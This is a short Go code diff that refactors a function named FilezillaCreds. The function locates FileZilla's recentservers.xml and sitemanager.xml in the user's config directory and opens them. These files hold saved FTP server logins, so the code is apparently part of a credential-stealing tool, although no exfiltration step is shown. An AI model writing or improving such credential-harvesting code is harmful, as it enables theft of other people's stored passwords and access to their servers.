@@ -7,8 +7,6 @@ import (
 	"io"
 	"log"
 	"os"
-	"os/user"
-	"strings"
 )
 
 type FileZilla struct {
@@ -46,16 +44,14 @@ func logErr(err error) {
 	}
 }
 func FilezillaCreds() {
-	currentUser, err := user.Current()
-	logErr(err)
-
-	uD := currentUser.Username
-	username := strings.Split(uD, "\\")[1]
 	f1 := "recentservers.xml"
 	f2 := "sitemanager.xml"
-	path := "C:\\Users\\%s\\AppData\\Roaming\\FileZilla\\%s"
-	path1 := fmt.Sprintf(path, username, f1)
-	path2 := fmt.Sprintf(path, username, f2)
+	dir, dErr := os.UserConfigDir()
+	logErr(dErr)
+	path := dir + "\\FileZilla\\%s"
+	path1 := fmt.Sprintf(path, f1)
+	path2 := fmt.Sprintf(path, f2)
+	fmt.Println(path1)
 	recSerFile, fErr := os.Open(path1)
 	var byteValue []byte
 	var rErr error
